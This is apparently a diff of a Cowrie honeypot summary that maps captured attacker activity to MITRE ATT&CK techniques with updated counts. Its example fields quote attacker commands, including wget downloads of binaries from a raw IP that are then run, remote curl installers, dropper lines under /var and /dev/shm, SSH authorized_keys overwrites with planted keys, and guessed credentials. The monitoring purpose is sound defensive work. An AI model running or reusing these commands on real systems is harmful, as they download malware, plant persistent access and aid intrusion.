@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-09-24 16:03:46",
+  "generated": "2026-09-24 17:00:10",
   "totals": {
-    "commands": 5652,
-    "login_failed": 4269,
-    "login_success": 1348,
-    "sessions": 4782
+    "commands": 6208,
+    "login_failed": 4451,
+    "login_success": 1502,
+    "sessions": 4978
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 4269,
+      "count": 4451,
       "examples": [
         "suser / 123456",
         "antonio / antonio",
@@ -21,14 +21,14 @@
         "root / Pass2024"
       ],
       "first": "2026-09-24T00:00:32.122319Z",
-      "last": "2026-09-24T16:03:38.480717Z",
-      "unique_ips": 116
+      "last": "2026-09-24T16:59:59.179060Z",
+      "unique_ips": 120
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 1348,
+      "count": 1502,
       "examples": [
         "root / root",
         "root / mk@123456",
@@ -37,28 +37,28 @@
         "user / user"
       ],
       "first": "2026-09-24T00:04:51.269971Z",
-      "last": "2026-09-24T16:03:38.978343Z",
-      "unique_ips": 93
+      "last": "2026-09-24T16:59:59.608089Z",
+      "unique_ips": 97
     },
     {
       "id": "T1083",
       "name": "File and Directory Discovery",
       "tactic": "Discovery",
-      "count": 955,
+      "count": 956,
       "examples": [
         "ls -lh $(which ls)",
         "ls /home; /bin/busybox BOTNET",
         "ls -la ~/.local/share/TelegramDesktop/tdata /home/*/.local/share/TelegramDesktop/tdata /dev/ttyGSM* /dev/ttyUSB-mod* /va"
       ],
       "first": "2026-09-24T00:16:08.185425Z",
-      "last": "2026-09-24T14:36:55.803794Z",
-      "unique_ips": 18
+      "last": "2026-09-24T16:07:43.597027Z",
+      "unique_ips": 19
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 882,
+      "count": 932,
       "examples": [
         ">/var/.f && chmod 777 /var/.f && /var/.f && cd /var/;",
         ">/var/tmp/.f && chmod 777 /var/tmp/.f && /var/tmp/.f && cd /var/tmp/;",
@@ -67,14 +67,14 @@
         ">/dev/shm/.f && chmod 777 /dev/shm/.f && /dev/shm/.f && cd /dev/shm/;"
       ],
       "first": "2026-09-24T00:04:54.092424Z",
-      "last": "2026-09-24T15:05:46.339535Z",
-      "unique_ips": 53
+      "last": "2026-09-24T16:52:32.748093Z",
+      "unique_ips": 56
     },
     {
       "id": "T1082",
       "name": "System Information Discovery",
       "tactic": "Discovery",
-      "count": 158,
+      "count": 168,
       "examples": [
         "cat /proc/cpuinfo | grep name | wc -l",
         "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
@@ -83,14 +83,14 @@
         "cat /proc/cpuinfo | grep model | grep name | wc -l"
       ],
       "first": "2026-09-24T00:16:03.897652Z",
-      "last": "2026-09-24T15:08:13.549563Z",
-      "unique_ips": 29
+      "last": "2026-09-24T16:33:19.419364Z",
+      "unique_ips": 31
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 62,
+      "count": 63,
       "examples": [
         "if ! command -v curl &> /dev/null; then apt-get update -y && apt-get install -y curl || yum install -y curl; fi",
         "bash <(curl -sL https://raw.githubusercontent.com/komari-monitor/komari-agent/refs/heads/main/install.sh) -e https://sex",
@@ -99,14 +99,14 @@
         "mkdir -p /usr/lib/.sysd-scan/tmhome && curl -sL -o /tmp/tm.sh https://del.sou.pp.ua/install_tm.sh && cd /usr/lib/.sysd-s"
       ],
       "first": "2026-09-24T00:15:58.081526Z",
-      "last": "2026-09-24T14:46:59.281955Z",
-      "unique_ips": 26
+      "last": "2026-09-24T16:07:31.458066Z",
+      "unique_ips": 27
     },
     {
       "id": "T1033",
       "name": "System Owner/User Discovery",
       "tactic": "Discovery",
-      "count": 39,
+      "count": 41,
       "examples": [
         "w",
         "whoami",
@@ -115,14 +115,14 @@
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w"
       ],
       "first": "2026-09-24T00:16:09.607300Z",
-      "last": "2026-09-24T15:05:46.339535Z",
-      "unique_ips": 23
+      "last": "2026-09-24T16:07:53.461237Z",
+      "unique_ips": 24
     },
     {
       "id": "T1057",
       "name": "Process Discovery",
       "tactic": "Discovery",
-      "count": 34,
+      "count": 36,
       "examples": [
         "crontab -l",
         "top",
@@ -130,21 +130,21 @@
         "ps -ef | grep '[Mm]iner'"
       ],
       "first": "2026-09-24T00:16:08.904262Z",
-      "last": "2026-09-24T14:36:55.064818Z",
-      "unique_ips": 17
+      "last": "2026-09-24T16:07:49.887913Z",
+      "unique_ips": 18
     },
     {
       "id": "T1098.004",
       "name": "Account Manipulation: SSH Authorized Keys",
       "tactic": "Persistence",
-      "count": 18,
+      "count": 19,
       "examples": [
         "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1",
         "mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo \"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHQGOxKK322AbGwPqefUy1MUBZ"
       ],
       "first": "2026-09-24T00:15:57.120124Z",
-      "last": "2026-09-24T14:33:45.365800Z",
-      "unique_ips": 18
+      "last": "2026-09-24T16:07:31.160922Z",
+      "unique_ips": 19
     },
     {
       "id": "T1070.004",
@@ -211,31 +211,31 @@
   "unmapped": [
     [
       "sh",
-      1267
+      1419
     ],
     [
       "system",
-      1267
+      1419
     ],
     [
       "shell",
-      329
+      481
     ],
     [
       "/bin/busybox HISILICON",
-      202
+      214
     ],
     [
       "enable",
-      141
+      149
     ],
     [
       "ping; sh",
-      135
+      143
     ],
     [
       "/bin/busybox cat /proc/self/exe || cat /proc/self/exe",
-      68
+      72
     ],
     [
       "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
@@ -247,7 +247,7 @@
     ],
     [
       "/bin/busybox UNSTABLE",
-      9
+      10
     ],
     [
       "zalee",
